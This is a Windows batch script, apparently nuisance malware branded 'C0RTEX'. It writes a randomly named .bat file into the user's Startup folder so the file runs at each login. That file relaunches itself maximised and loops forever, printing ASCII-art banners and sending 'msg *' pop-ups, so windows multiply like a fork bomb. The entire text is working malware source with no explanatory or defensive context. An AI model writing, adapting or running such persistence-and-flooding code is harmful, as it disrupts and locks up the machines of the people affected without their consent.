@echo off
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
set /A "slump"=%RANDOM% > nul
(
    echo @echo off
    echo title C0RTEX
    echo color 0c
::    echo copy /y %%~nx0 %%RANDOM%%.bat ^> nul
    echo start /max %%~nx0
    echo :a
    echo echo  .o88b.  .d88b.  d8888b. d888888b d88888b db    db
    echo echo d8P  Y8 .8P  88. 88  `8D `~~88~~' 88'     `8b  d8'
    echo echo 8P      88  d'88 88oobY'    88    88ooooo  `8bd8'
    echo echo 8b      88 d' 88 88`8b      88    88~~~~~  .dPYb.
    echo echo Y8b  d8 `88  d8' 88 `88.    88    88.     .8P  Y8.
    echo echo  `Y88P'  `Y88P'  88   YD    YP    Y88888P YP    YP
    echo msg * C0RTEX
    echo msg * CORTEX
    echo msg * C0RTEX
    echo goto a
) > %slump%.bat